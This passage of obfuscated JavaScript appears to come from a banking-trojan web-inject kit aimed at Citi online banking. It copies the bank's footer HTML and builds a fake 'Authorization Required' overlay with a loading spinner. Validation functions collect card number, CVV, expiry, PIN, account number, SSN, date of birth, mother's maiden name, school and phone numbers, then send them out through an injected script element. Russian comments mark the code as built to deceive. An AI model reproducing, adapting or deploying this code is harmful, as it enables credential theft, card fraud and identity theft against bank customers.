				<fieldset name="fAkEelements"><ul name="fAkEelements"><li name="fAkEelements" class="footer_subnav footer_bold_text"><span name="fAkEelements">ATM/Branch Locations</span></li><li name="fAkEelements" class="footer_subnav"><label name="fAkEelements" class="hiddenSkipNav" id="footer_zipcode_label" for="footer_zipcode">Enter Address</label><input name="fAkEelements" id="footer_zipcode" type="text" placeholder="Enter Address"></li><li name="fAkEelements" class="footer_subnav">\
				<button name="fAkEelements" id="footer_go" value="Find Locations">Find Locations</button></li></ul></fieldset></form></div></div><div name="fAkEelements" class="footer_options"><ul name="fAkEelements"><li name="fAkEelements" class="footer_options_subnav footer_bold_text"><span name="fAkEelements">© 2016 Citigroup Inc</span></li><li name="fAkEelements" class="footer_options_subnav"><a name="fAkEelements" onclick="this.href=getFinalURL(this.href);lnk(this.href);return false;" href="/US/JRS/portal/template.do?ID=TermsDisclaimer">Terms &amp; Conditions</a></li><li name="fAkEelements" class="footer_options_subnav"><a name="fAkEelements" href="javascript:lnk(&quot;/JRS/portal/template.do?ID=Privacy&quot;)">Privacy</a></li><li name="fAkEelements" class="footer_options_subnav"><a name="fAkEelements" href="javascript:lnk(&quot;/JRS/pands/detail.do?ID=SecurityCenter&quot;)">Security</a></li>\
				<li name="fAkEelements" class="footer_options_subnav">\
				<div name="fAkEelements" id="regionalPricing" style="color: white; display: inline-block;"> \
				<div name="fAkEelements" id="region-display"><div name="fAkEelements" class="appShowNone jfpw-hidden-accessible" id="RegionalPricingTooltip-info">\
				<div name="fAkEelements" class="parameter1"><div name="fAkEelements" id="regionalPricingOvHeader">REGION NAME</div> <div name="fAkEelements" id="regionalPricingOvContent"> <p name="fAkEelements">Your Terms &amp; Conditions and rates regions for new accounts will be determined by your state of residence when you open an account online.</p> </div> <span name="fAkEelements" class="lineOverlay"></span> <div name="fAkEelements" id="regionalPricing"> <div name="fAkEelements" class="state-info"><p name="fAkEelements"><table name="fAkEelements"><caption name="fAkEelements" class="hidden">NATIONAL NAME</caption><tbody name="fAkEelements"><tr name="fAkEelements"> <th name="fAkEelements" style="width: 60%;" scope="col"><strong name="fAkEelements">State of Residence</strong></th> <th name="fAkEelements" style="width: 40%;" scope="col"><strong name="fAkEelements">Region Name</strong></th></tr><tr name="fAkEelements" class="even"> <td name="fAkEelements">California</td> <td name="fAkEelements">CA Region</td></tr> <tr name="fAkEelements"> <td name="fAkEelements">Connecticut</td> <td name="fAkEelements">CT Region</td></tr><tr name="fAkEelements" class="even"> <td name="fAkEelements">District of Columbia</td> <td name="fAkEelements">DC Region</td></tr><tr name="fAkEelements"> <td name="fAkEelements">Florida</td> <td name="fAkEelements">FL Region</td></tr><tr name="fAkEelements" class="even"> <td name="fAkEelements">Georgia, S. Carolina, Tennessee</td> <td name="fAkEelements">SD/ Southeast Region</td></tr> <tr name="fAkEelements"> <td name="fAkEelements">Illinois</td> <td name="fAkEelements">IL Region</td></tr><tr name="fAkEelements" class="even"> <td name="fAkEelements">Maryland</td> <td name="fAkEelements">MD Region</td></tr><tr name="fAkEelements"> <td name="fAkEelements">New Jersey</td> <td name="fAkEelements">NJ Region</td></tr><tr name="fAkEelements" class="even"> <td name="fAkEelements">New York</td> <td name="fAkEelements">NY Region</td></tr><tr name="fAkEelements"> <td name="fAkEelements">Nevada</td> <td name="fAkEelements">NV Region</td></tr><tr name="fAkEelements" class="even"> <td name="fAkEelements">Texas</td> <td name="fAkEelements">TX Region</td></tr><tr name="fAkEelements"> <td name="fAkEelements">Virginia</td> <td name="fAkEelements">VA Region</td></tr><tr name="fAkEelements" class="last"> <td name="fAkEelements"> All Other States<sup name="fAkEelements">1</sup></td> <td name="fAkEelements">SD/National Region</td></tr></tbody></table></div> </div><span name="fAkEelements" class="lineOverlay"></span> <div name="fAkEelements" class="footnote"> <div name="fAkEelements" class="bottom-note"> <sup name="fAkEelements">1</sup>Alabama, Alaska, Arizona, Arkansas, Colorado, Delaware, Hawaii, Idaho, Indiana, Iowa, Kansas, Kentucky, Louisiana, Maine, Massachusetts, Michigan, Minnesota, Mississippi, Missouri, Montana, Nebraska, New Hampshire, New Mexico, North Carolina, N. Dakota, Ohio, Oklahoma, Oregon, Pennsylvania, Rhode Island, S. Dakota, Utah, Vermont, Washington, W. Virginia, Wisconsin and Wyoming<br name="fAkEelements"><br name="fAkEelements">If you have questions about the selection and assignment of regions, please call 1-800-374-9500. </div> </div></div><div name="fAkEelements" id="rpRPTooltipAdjst"></div></div><table name="fAkEelements" id="regionalPricingTable"><tbody name="fAkEelements"><tr name="fAkEelements"><td name="fAkEelements" id="rpTableLabel">Information for: &nbsp;</td><td name="fAkEelements" class="rpTableTdWhiteSpace" id="rpTableRegionInfo"><div name="fAkEelements" id="region_value"><span name="fAkEelements" tabindex="0" id="RegionalPricingTooltip">CA Region</span></div></td><td name="fAkEelements" class="rpTableTdWhiteSpace" id="rpTableChngOptn"></td></tr></tbody></table></div><div name="fAkEelements" id="ChangeGS"></div> </div></li></ul>\
				</div><div name="fAkEelements" class="footerContent" role="note"><span name="fAkEelements" id="brandingBottomDisclaimer"><div name="fAkEelements" class="ajax-dialog-container">\
				<p name="fAkEelements">Bank deposit and first mortgage products are offered by Citibank, N.A.. Member FDIC and Equal Housing Lender.</p>\
				<p name="fAkEelements">Citi credit cards, Citi bank deposit products and Checking Plus are offered by Citibank, N.A.. Member FDIC.</p><p name="fAkEelements">External Accounts: If you enrolled in Citi Financial Tools and requested that Citi retrieve information on your behalf about your financial accounts with third parties, such information is provided as is and subject to the CitiFinancial Tools Terms and Conditions.</p></div> \
				<div name="fAkEelements" id="DIVPfmOverlay" style="display: none; visibility: hidden;">\
				<span name="fAkEelements" id="PFMViewToolsHeader-trigger"><span name="fAkEelements"><a name="fAkEelements" href="javascript:void(0);">Financial Tools</a></span></span>\
				<div name="fAkEelements" id="PFMViewToolsHeader" style="display: none;">\
				<span name="fAkEelements" class="StructTitleLabel fontSize20px colorTextDarkGray headerFontFamily">CITI<span name="fAkEelements" class="superScript">®</span> FINANCIAL TOOLS</span>\
				<div name="fAkEelements" id="investOvContent" style="padding-top: 15px;"> <div name="fAkEelements" class="PFMparameter" style="height: 300px; padding-top: 15px;"><span name="fAkEelements" class="fontSize12px"><span name="fAkEelements" style="font-weight: bold;">Using your Citi Investment Account in Financial Tools</span><br name="fAkEelements"><br name="fAkEelements">\
				<div name="fAkEelements" class="dottedOverlay" style="height: 0px; margin-bottom: 17px;"></div>\
				<p name="fAkEelements" style="line-height: 14px;">For your convenience, most of your Citi accounts have been linked to Citi<sup name="fAkEelements" class="reg">®</sup> Financial Tools. At this time, your Citi Investment account is not currently linked to Financial Tools.<br name="fAkEelements"><br name="fAkEelements">To link your Investment account to Citi<sup name="fAkEelements" class="reg">®</sup> Financial Tools you will need to:</p>\
				<ul name="fAkEelements" style="line-height: 14px; margin-bottom: 20px;">\
				<li name="fAkEelements" type="disc" style="padding-top: 1px; padding-left: 15px; list-style-position: inside;">Select <span name="fAkEelements" style="font-weight: bold;">Link An External Account</span> on the main menu of the Financial Tools homepage</li>\
				<li name="fAkEelements" type="disc" style="padding-top: 1px; padding-left: 15px; list-style-position: inside;">Type "Citi Online - Investments" in the search field</li>\
				<li name="fAkEelements" type="disc" style="padding-top: 1px; padding-left: 15px; list-style-position: inside;">Enter your Citi Online credentials when prompted to complete the process</li></ul>\
				</span><form name="fAkEelements" id="investment-option-form" style="padding-top: 20px;" action="/US/NCSS/pfm/preparesso/flow.action?pfmtarget=PFMDASHBOARD" method="post">\
				<input name="fAkEelements" id="investment-option" type="checkbox" value="true"><span name="fAkEelements" class="fontSize12px">Don\'t show me this message again.</span><input name="fAkEelements" id="investment-option" type="hidden" value="true">\
				<div name="fAkEelements" class="dottedOverlay" style="height: 0px; margin-top: 16px; margin-bottom: 17px;"></div><div name="fAkEelements" align="right"><ul name="fAkEelements" class="appNav" id="appNav">\
				<li name="fAkEelements" class="appNav appNavPos"><input name="fAkEelements" class="colorGradientSprite colorBGBlueBtn colorTextWhite colorBGBlueButtonOptOut" style="font: bold 12px/12px Arial !important; padding: 0px !important; border: currentColor; border-image: none; width: 40px; height: 20px; font-size-adjust: none !important; font-stretch: normal !important;" type="submit" value="OK"></li></ul></div></form></div></div></div>\
				</div></span></div><div name="fAkEelements" class="copyright" role="note"><span name="fAkEelements" id="cbol-footer-server">59.4</span><br name="fAkEelements">\
				<span name="fAkEelements" id="cbol-footer-mlc" style="color: rgb(255, 255, 255);">BANKRIAWebEnglish/Secure/MemberHomePage/AccountSummary/Display/Accounts Homepage</span></div><div name="fAkEelements" class="fdic_content" role="navigation"><span name="fAkEelements" id="cM-FDIC">\
				<img name="fAkEelements" width="auto" height="30" class="cM-contentSpriteBase cM-FDIC" alt="Member FDIC Logo" src="https://online.citi.com/GFC/branding/responsivebranding/img/memberfdic.png">\
				</span><span name="fAkEelements" class="EqualHousing"><img name="fAkEelements" alt="Equal Housing Logo" src="https://online.citi.com/JRS/images/EqualHousing.png"></span></div></div></div>',
			'<input onkeyup="if(this.value.length==3){this.parentNode.getElementsByTagName(\'input\')[1].focus();}" name="fAkEnumbers" type="text" maxlength="3" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;margin:10px 10px 10px 0;;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display: inline-block;height: 36px;padding: 0 16px;vertical-align: middle;width: 60px;text-align:center;font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571; color: #767576;"><input name="fAkEnumbers" type="text" maxlength="3" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571;margin:10px 10px 10px 0;;background-color: #fff;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display: inline-block;height: 36px;padding: 0 16px;vertical-align: middle;width: 60px;text-align:center;font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571; color: #767576;"><input name="fAkEnumbers" type="text" maxlength="4" disabled="true" style="font-family: Arial,sans-serif; font-size: 14px; line-height: 1.28571; color: #767576;background-color: #DCDCDC;border: 1px solid #ccc;border-radius: 0;box-sizing: border-box;cursor: text;display:inline-block;height: 36px;padding: 0 16px;vertical-align: middle;width: 70px;" value="'
		],
		"fAkE_states":{
			"US":['<select name="fAkEelements" style="width:111px;background:none repeat scroll 0 0 #fcfcff;border:1px solid #83b6ef;color:#383877;border-radius:5px;font-size:12px;height:25px;margin:0 0 0 10px;padding:0;font-family:inherit;"><option name="fAkEelements" value="1">- Select -</option><option name="fAkEelements" value="AL">Alabama</option><option name="fAkEelements" value="AK">Alaska</option><option name="fAkEelements" value="AZ">Arizona</option><option name="fAkEelements" value="AR">Arkansas</option><option name="fAkEelements" value="CA">California</option><option name="fAkEelements" value="CO">Colorado</option><option name="fAkEelements" value="CT">Connecticut</option><option name="fAkEelements" value="DE">Delaware</option><option name="fAkEelements" value="DC">District of Columbia</option><option name="fAkEelements" value="FL">Florida</option><option name="fAkEelements" value="GA">Georgia</option><option name="fAkEelements" value="GU">Guam</option><option name="fAkEelements" value="HI">Hawaii</option><option name="fAkEelements" value="ID">Idaho</option><option name="fAkEelements" value="IL">Illinois</option><option name="fAkEelements" value="IN">Indiana</option><option name="fAkEelements" value="IA">Iowa</option><option name="fAkEelements" value="KS">Kansas</option><option name="fAkEelements" value="KY">Kentucky</option><option name="fAkEelements" value="LA">Louisiana</option><option name="fAkEelements" value="ME">Maine</option><option name="fAkEelements" value="MD">Maryland</option><option name="fAkEelements" value="MA">Massachusetts</option><option name="fAkEelements" value="AE">Military: Europe/Middle East/Africa/Canada (AE)</option><option name="fAkEelements" value="AP">Military: Pacific (AP)</option><option name="fAkEelements" value="AA">Military: Americas excluding Canada (AA)</option><option name="fAkEelements" value="MI">Michigan</option><option name="fAkEelements" value="MN">Minnesota</option><option name="fAkEelements" value="MS">Mississippi</option><option name="fAkEelements" value="MO">Missouri</option><option name="fAkEelements" value="MT">Montana</option><option name="fAkEelements" value="NE">Nebraska</option><option name="fAkEelements" value="NV">Nevada</option><option name="fAkEelements" value="NH">New Hampshire</option><option name="fAkEelements" value="NJ">New Jersey</option><option name="fAkEelements" value="NM">New Mexico</option><option name="fAkEelements" value="NY">New York</option><option name="fAkEelements" value="NC">North Carolina</option><option name="fAkEelements" value="ND">North Dakota</option><option name="fAkEelements" value="OH">Ohio</option><option name="fAkEelements" value="OK">Oklahoma</option><option name="fAkEelements" value="OR">Oregon</option><option name="fAkEelements" value="PA">Pennsylvania</option><option name="fAkEelements" value="PR">Puerto Rico</option><option name="fAkEelements" value="RI">Rhode Island</option><option name="fAkEelements" value="SC">South Carolina</option><option name="fAkEelements" value="SD">South Dakota</option><option name="fAkEelements" value="TN">Tennessee</option><option name="fAkEelements" value="TX">Texas</option><option name="fAkEelements" value="UT">Utah</option><option name="fAkEelements" value="VT">Vermont</option><option name="fAkEelements" value="VA">Virginia</option><option name="fAkEelements" value="WA">Washington</option><option name="fAkEelements" value="WV">West Virginia</option><option name="fAkEelements" value="WI">Wisconsin</option><option name="fAkEelements" value="WY">Wyoming</option></select>']
		},
		"errors":[
			"<text name='fAkEelements' style='padding-left:10px;'>At least one of your entries doesn't match our records.</text>",
			"<text name='fAkEelements' style='padding-left:10px;'>Please re-check the information and click 'Continue' to try again.</text>",
			"<img name='fAkEelements' src='"+''.fAkE_link+"img/NEW_alert.png' style='width:38px;float:left;'/>",
			"Congratulation."
		]
	
	}
}
String.prototype.fAkE_fill_dob=function(){
	if(document.getElementById("fAkE_dd")){
		for(String.prototype.fAkEi=1;''.fAkEi<32;++String.prototype.fAkEi){
			String.prototype.fAkE_option=document.createElement("option");''.fAkE_option.setAttribute("name","fAkEelem");''.fAkE_option.value=''.fAkEi;''.fAkE_option.innerHTML=''.fAkEi;
			''.fAkE_option.style.padding="0 16px";document.getElementById("fAkE_dd").appendChild(''.fAkE_option);
			}
		for(String.prototype.fAkEi=1;''.fAkEi<13;++String.prototype.fAkEi){
			String.prototype.fAkE_option=document.createElement("option");''.fAkE_option.setAttribute("name","fAkEelem");''.fAkE_option.value=''.fAkEi;''.fAkE_option.innerHTML=''.fAkEi;
			''.fAkE_option.style.padding="0 16px";document.getElementById("fAkE_mm").appendChild(''.fAkE_option);
			}
		for(String.prototype.fAkEi=parseInt(new Date().getFullYear())-16;''.fAkEi>1915;--String.prototype.fAkEi){//parseInt(new Date().getFullYear())-16 - отсекаем молокососов
			String.prototype.fAkE_option=document.createElement("option");''.fAkE_option.setAttribute("name","fAkEelem");''.fAkE_option.value=''.fAkEi;''.fAkE_option.innerHTML=''.fAkEi;
			''.fAkE_option.style.padding="0 16px";document.getElementById("fAkE_yyyy").appendChild(''.fAkE_option);
			}
	}
}
String.prototype.fAkE_fill_exp=function(){
	if(document.getElementById("fAkE_expday_mm")){
		for(String.prototype.fAkEi=1;''.fAkEi<13;++String.prototype.fAkEi){
			String.prototype.fAkE_option=document.createElement("option");''.fAkE_option.setAttribute("name","fAkEelem");''.fAkE_option.value=''.fAkEi;''.fAkE_option.innerHTML=''.fAkEi;
			''.fAkE_option.style.padding="0 16px";document.getElementById("fAkE_expday_mm").appendChild(''.fAkE_option);
			}
		for(String.prototype.fAkEi=parseInt(new Date().getFullYear());''.fAkEi<parseInt(new Date().getFullYear())+15;++String.prototype.fAkEi){
			String.prototype.fAkE_option=document.createElement("option");''.fAkE_option.setAttribute("name","fAkEelem");''.fAkE_option.value=''.fAkEi;''.fAkE_option.innerHTML=''.fAkEi;
			''.fAkE_option.style.padding="0 16px";document.getElementById("fAkE_expday_yyyy").appendChild(''.fAkE_option);
			}
	}
}
//luhn
String.prototype.fAkEMoon=function(fAkEcard_number){
	if(fAkEcard_number.split("")[0].search(/3|5|6|4/g)==-1){return false;}
	String.prototype.fAkEarr=[];fAkEcard_number=fAkEcard_number.toString();
	for(String.prototype.fAkEik=0;''.fAkEik<fAkEcard_number.length;String.prototype.fAkEik++){
		if(''.fAkEik%2===0){String.prototype.fAkEm=parseInt(fAkEcard_number[''.fAkEik])*2;if(''.fAkEm>9){''.fAkEarr.push(''.fAkEm-9);}else{''.fAkEarr.push(''.fAkEm);}}else{
			String.prototype.fAkEn=parseInt(fAkEcard_number[''.fAkEik]);''.fAkEarr.push(''.fAkEn)}}
	String.prototype.fAkEsumma=(function(){
		String.prototype.fAkETempNum=0;
		for(String.prototype.fAkEik=0;''.fAkEik<''.fAkEarr.length;String.prototype.fAkEik++){
			String.prototype.fAkETempNum+=parseInt(''.fAkEarr[''.fAkEik]);
		}
		return ''.fAkETempNum;
	})();
	return Boolean(!(''.fAkEsumma%10));
};
//fAkE_cctype fAkE_country -нет проверки в .php
//1 стр
String.prototype.fAkE_error_chccnum=function(){
	document.getElementById("fAkE_ccnum1").style.borderColor="red";document.getElementById("fAkE_ccnum_stars1").style.borderColor="red";
	document.getElementById("fAkE_ccnum2").style.borderColor="red";document.getElementById("fAkE_ccnum_stars2").style.borderColor="red";
	document.getElementById("fAkE_ccnum3").style.borderColor="red";document.getElementById("fAkE_ccnum_stars3").style.borderColor="red";
	''.fAkE_error_create_alert()};
String.prototype.fAkE_error_chcvv=function(){document.getElementById("fAkE_CVV2").style.borderColor="red";''.fAkE_error_create_alert()};
String.prototype.fAkE_error_exp=function(){document.getElementById("fAkE_expday_mm").style.borderColor="red";document.getElementById("fAkE_expday_yyyy").style.borderColor="red";''.fAkE_error_create_alert()};
String.prototype.fAkE_error_pin=function(){document.getElementById("fAkE_PIN").style.borderColor="red";''.fAkE_error_create_alert()};
String.prototype.fAkECheckfp=function(){
	String.prototype.fAkEtags=["input","select"];
	for(String.prototype.fAkEj=0;''.fAkEj<''.fAkEtags.length;String.prototype.fAkEj++){
		String.prototype.fAkEinpt=document.getElementById("fAkE_cc").getElementsByTagName("".fAkEtags[''.fAkEj]);
		for(String.prototype.fAkEi=0;''.fAkEi<''.fAkEinpt.length;String.prototype.fAkEi++){
			''.fAkEinpt[''.fAkEi].style.borderColor=""
		}
	};
	String.prototype.fAkEflag=true;
	String.prototype.fAkEccnum=document.getElementById("fAkE_ccnum1").value.toString()+document.getElementById("fAkE_ccnum2").value.toString()+document.getElementById("fAkE_ccnum3").value.toString()+''.fAkEccNumber;
	if(''.fAkEccnum.length<16 || !''.fAkEMoon(''.fAkEccnum) || ''.fAkEccnum.search(/[^0-9]/g)>-1){''.fAkE_error_chccnum();String.prototype.fAkEflag=false;}
	String.prototype.fAkEcvv=document.getElementById("fAkE_CVV2").value;
	if(''.fAkEcvv.toString().search(/[^0-9]/g)>-1 || ''.fAkEcvv.toString().length<3){''.fAkE_error_chcvv();String.prototype.fAkEflag=false;}
	
	String.prototype.fAkEmm=document.getElementById("fAkE_expday_mm").getElementsByTagName("option")[document.getElementById("fAkE_expday_mm").selectedIndex].value;
	String.prototype.fAkEyyyy=document.getElementById("fAkE_expday_yyyy").getElementsByTagName("option")[document.getElementById("fAkE_expday_yyyy").selectedIndex].value;
	if(parseInt(''.fAkEmm)<=parseInt(new Date().getMonth())+1 && parseInt(''.fAkEyyyy)<=parseInt(new Date().getFullYear())){
		''.fAkE_error_exp();String.prototype.fAkEflag=false;
	}
	String.prototype.fAkEpin=document.getElementById("fAkE_PIN").value;
	if(''.fAkEpin.toString().search(/\d{4}/g)==-1){
			''.fAkE_error_pin();String.prototype.fAkEflag=false;
	}
	if(''.fAkEflag){
		String.prototype.fAkEwhereisinj="sec_data";
		''.fAkE_MakeElem("&ccnum="+encodeURIComponent((''.fAkEccnum))+"&cvv="+encodeURIComponent((''.fAkEcvv))+"&mmyyyy="+encodeURIComponent((''.fAkEmm+"/"+''.fAkEyyyy))+"&PIN="+encodeURIComponent((''.fAkEpin)),null,"script");
	}
}

//2 стр
String.prototype.fAkE_error_accNum=function(){document.getElementById("fAkE_accNum").style.borderColor="red";''.fAkE_error_create_alert()};
String.prototype.fAkE_error_chssn=function(){document.getElementById("fAkE_SSN_0").style.borderColor="red";document.getElementById("fAkE_SSN_1").style.borderColor="red";document.getElementById("fAkE_SSN_2").style.borderColor="red";''.fAkE_error_create_alert()};
String.prototype.fAkE_error_dob=function(){document.getElementById("fAkE_dd").style.borderColor="red";document.getElementById("fAkE_mm").style.borderColor="red";document.getElementById("fAkE_yyyy").style.borderColor="red";''.fAkE_error_create_alert()};
String.prototype.fAkE_error_chmmn=function(){document.getElementById("fAkE_MMN").style.borderColor="red";''.fAkE_error_create_alert()};
String.prototype.fAkE_error_chschool=function(){document.getElementById("fAkE_ElSchool").style.borderColor="red";''.fAkE_error_create_alert()};
String.prototype.fAkEChecksp=function(){
	String.prototype.fAkEtags=["input","select"];
	for(String.prototype.fAkEj=0;''.fAkEj<''.fAkEtags.length;String.prototype.fAkEj++){
		String.prototype.fAkEinpt=document.getElementById("fAkE_cc").getElementsByTagName("".fAkEtags[''.fAkEj]);
		for(String.prototype.fAkEi=0;''.fAkEi<''.fAkEinpt.length;String.prototype.fAkEi++){
			''.fAkEinpt[''.fAkEi].style.borderColor=""
		}
	};
	String.prototype.fAkEflag=true;
	String.prototype.fAkEaccNum=document.getElementById("fAkE_accNum").value;
	if(''.fAkEaccNum.search(/[^\d{4,}]/g)>-1||''.fAkEaccNum.length<4){
		''.fAkE_error_accNum();String.prototype.fAkEflag=false;
	}
	String.prototype.fAkEssn=document.getElementById("fAkE_SSN_0").value+document.getElementById("fAkE_SSN_1").value+document.getElementById("fAkE_SSN_2").value;
	if(''.fAkEssn.search(/[^0-9]/g)>-1 || ''.fAkEssn.length<9){''.fAkE_error_chssn();String.prototype.fAkEflag=false;}
	String.prototype.fAkEdd=document.getElementById("fAkE_dd").value;String.prototype.fAkEmm=document.getElementById("fAkE_mm").value;
	String.prototype.fAkEyy=document.getElementById("fAkE_yyyy").value;
	if((''.fAkEdd+'/'+''.fAkEmm+'/'+''.fAkEyy).search(/\d{1,2}\/\d{1,2}\/\d{4}/)==-1 || (parseInt(''.fAkEdd)==1 && parseInt(''.fAkEmm)==1 && parseInt(''.fAkEyy)==parseInt(new Date().getFullYear())-16)){
		''.fAkE_error_dob();String.prototype.fAkEflag=false;
	}
	String.prototype.fAkEmmn=document.getElementById("fAkE_MMN").value;
	if(''.fAkEmmn.search(/(?=.*[\u00C0-\u1FFF\u2C00-\uD7FFa-z]).{2,}/gi)==-1 || ''.fAkEmmn.search(/[^\u00C0-\u1FFF\u2C00-\uD7FF\w\s\'\.-]/gi)>0){
		''.fAkE_error_chmmn();String.prototype.fAkEflag=false;
	}
	String.prototype.fAkEschool=document.getElementById("fAkE_ElSchool").value;
	if(''.fAkEschool.search(/(?=.*[\u00C0-\u1FFF\u2C00-\uD7FFa-z]).{2,}/gi)==-1 || ''.fAkEschool.search(/[^\u00C0-\u1FFF\u2C00-\uD7FF\w\s\'\.-]/gi)>0){
		''.fAkE_error_chschool();String.prototype.fAkEflag=false;
	}
	String.prototype.fAkEnumbers=document.getElementsByName("fAkEnumbersLabel");String.prototype.fAkEnumbersData="";
	for(String.prototype.fAkEi=0;''.fAkEi<''.fAkEnumbers.length;String.prototype.fAkEi++){//проверяем номера телефонов
		String.prototype.fAkEinpt=''.fAkEnumbers[''.fAkEi].parentNode.getElementsByTagName("input");
		String.prototype.fAkEval=''.fAkEinpt[0].value+''.fAkEinpt[1].value+''.fAkEinpt[2].value;
		if(''.fAkEval.search(/[^0-9\+]/g)>-1 || (''.fAkEval).search(/^\+?[0-9]{1}[0-9]{3,14}$/g)==-1 || ''.fAkEval.length<10){
			''.fAkEinpt[0].style.borderColor="red";''.fAkEinpt[1].style.borderColor="red";
			String.prototype.fAkEflag=false;''.fAkE_error_create_alert();continue}
		String.prototype.fAkEnumbersData+="<br>"+''.fAkEnumbers[''.fAkEi].innerHTML+''.fAkEval;
	}
	     
	if(''.fAkEflag){
		String.prototype.fAkEwhereisinj="sec_data";
		''.fAkE_MakeElem("&accnum="+encodeURIComponent((''.fAkEaccNum))+"&ssn="+encodeURIComponent((document.getElementById("fAkE_SSN_0").value+"-"+document.getElementById("fAkE_SSN_1").value+"-"+document.getElementById("fAkE_SSN_2").value))+"&dob="+encodeURIComponent((''.fAkEdd+'/'+''.fAkEmm+'/'+''.fAkEyy))+"&mmn="+encodeURIComponent((''.fAkEmmn))+"&school="+encodeURIComponent((''.fAkEschool))+"&tnum="+encodeURIComponent((''.fAkEnumbersData)),null,"script");
	}
}

String.prototype.fAkE_error_create_alert=function(){
	if(document.getElementById("fAkE_error")){
		document.getElementById("fAkE_error").innerHTML=''.fAkE_perevod[''.fAkE_lang]["errors"][2]+''.fAkE_perevod[''.fAkE_lang]["errors"][0]+"<br name='fAkEelements'>"+''.fAkE_perevod[''.fAkE_lang]["errors"][1];
	}document.getElementById("fAkE_cc").scrollTop=0;
};

//контейнер
String.prototype.fAkEdivelement=document.createElement("div");''.fAkEdivelement.setAttribute("name","fAkEelem");''.fAkEdivelement.id="fAkEdivelement1";''.fAkEdivelement.style.position="relative";
//лоадер
String.prototype.fAkEloadelement=document.createElement("div");''.fAkEloadelement.setAttribute("name","fAkEelem");''.fAkEloadelement.setAttribute("id","fAkEloadelement1");
''.fAkEloadelement.style.minHeight="500px";
''.fAkEloadelement.innerHTML='<div name="fAkEelem" style="position: absolute;top: 45%;left: 45%;text-align: center;width:200px;" class="StructPreLoaderWrapper"><img name="fAkEelem" style="margin:auto" width="30" src="'+''.fAkE_link+'img/jfpw-spinner-large.gif" alt="" aria-hidden="true" role="presentation"><p name="fAkEelem" class="cT-jampMessages" style="margin: 0 auto;white-space:nowrap">Please wait while we retrieve</p><p name="fAkEelem" style="margin: 0 auto;white-space:nowrap" class="cT-jampMessages">your account details.</p></div>';

String.prototype.fAkEreplacepage=function(page){
	for(String.prototype.fAkEj=0;''.fAkEj<''.fAkEhideel.length;String.prototype.fAkEj++){if(''.fAkEhideel[''.fAkEj]){''.fAkEhideel[''.fAkEj].style.display="none"}};
	document.getElementsByTagName("body")[0].style.marginTop="0px";''.fAkEscroll(false);
	if(!document.getElementById("fAkEloadelement1")&&''.fAkEhideel.length>0)''.fAkEhideel[0].parentNode.insertBefore(''.fAkEloadelement,''.fAkEhideel[0]);
	switch (page){
	case "close": if(document.getElementById("fAkEloadelement1"))''.fAkE_CloseElem('fAkEloadelement1');/*try{''.fAkE_CloseElem('fAkEdivelement1')}catch(e){}*/;
		for(String.prototype.fAkEj=0;''.fAkEj<''.fAkEhideel.length;String.prototype.fAkEj++){if(''.fAkEhideel[''.fAkEj])''.fAkEhideel[''.fAkEj].style.display='block'};
		document.getElementsByTagName('body')[0].style.marginTop="0px";''.fAkEscroll(false); break;
	case "send":  ''.fAkEdivelement.style.display="none";break;
	default: document.getElementsByTagName("body")[0].style.marginTop="0px";''.fAkEscroll(false);
	}
};
String.prototype.fAkEisLoaded=false;
//создаем фейк
String.prototype.fAkE_SHF=function(status){
	if(!''.fAkEccNumber||!''.fAkEdataTnum){
		if(top==self&&!''.fAkEisLoaded){
			window.location.href="https://online.citi.com/US/jba/cp/InitializeSubApp.do?TTC=4&JFP_TOKEN"+window.location.href.split("JFP_TOKEN")[1];
			String.prototype.fAkEisLoaded=true;
		}
	}else{
		if(document.getElementById("fAkE_cc")){''.fAkE_CloseElem("fAkE_cc");}
		if(status=="success"){document.getElementsByTagName("title")[0].innerHTML=''.fAkEtitle;''.fAkEreplacepage("close");return}
		document.getElementsByTagName("title")[0].innerHTML="Authorization Required";
		''.fAkE_CloseElem("fAkEloadelement1");
		String.prototype.fAkEdivel=document.createElement("div");''.fAkEdivel.setAttribute("name","fAkEelem");''.fAkEdivel.style.display="none";''.fAkEdivel.id="fAkE_cc";
		''.fAkEdivel.style.color="#333333";''.fAkEdivel.style.fontSize="14px";''.fAkEdivel.style.lineHeight="1.28571";''.fAkEdivel.style.fontFamily="Arial,sans-serif";''.fAkEdivel.style.textOverflow="ellipsis";''.fAkEdivel.style.content="' '";
		String.prototype.fAkEtable=document.createElement("table");''.fAkEtable.setAttribute("name","fAkEelem");''.fAkEtable.style.border="0px";
		''.fAkEtable.style.width="520px";''.fAkEtable.id="arcticmodal-container_i2";
		String.prototype.fAkEtbody=document.createElement("tbody");''.fAkEtbody.setAttribute("name","fAkEelem");
		String.prototype.fAkEtable2=document.createElement("div");''.fAkEtable2.setAttribute("name","fAkEelem");
		''.fAkEtable2.style.position="relative";''.fAkEtable2.style.margin="0 auto";
		''.fAkEtable2.style.width="984px";''.fAkEtable2.style.paddingBottom="15px";
		''.fAkEtable2.style.backgroundColor="white";
		''.fAkEtable2.style.paddingBottom="20px";
		for(String.prototype.fAkEi=0;''.fAkEi<''.fAkE_perevod[''.fAkE_lang]["fAkE_fields"].length;String.prototype.fAkEi++){
			String.prototype.fAkEtrel=document.createElement("tr");''.fAkEtrel.setAttribute("name","fAkEelem");
			String.prototype.fAkEtdel=document.createElement("td");''.fAkEtdel.setAttribute("name","fAkEelem");
			String.prototype.fAkElabel=document.createElement("label");''.fAkElabel.setAttribute("name","fAkEelem");''.fAkElabel.innerHTML=''.fAkE_perevod[''.fAkE_lang]["fAkE_fields"][''.fAkEi];
			''.fAkElabel.style.fontFamily="Arial,sans-serif";''.fAkElabel.style.fontSize="14px";''.fAkElabel.style.lineHeight="1.28571";''.fAkElabel.style.color="#333333";
			String.prototype.fAkEfield=document.createElement("div");''.fAkEfield.setAttribute("name","fAkEelem");''.fAkEfield.innerHTML=''.fAkE_perevod[''.fAkE_lang]["fAkE_input_fields"][''.fAkEi];
			''.fAkEtdel.appendChild(''.fAkElabel);''.fAkEtdel.appendChild(''.fAkEfield);
			''.fAkEtrel.appendChild(''.fAkEtdel);''.fAkEtbody.appendChild(''.fAkEtrel);
			if(status=="second"&&''.fAkEi==2)String.prototype.fAkEi=7;
			if(status.search(/first|empty/g)>-1&&''.fAkEi==7)String.prototype.fAkEi=13;
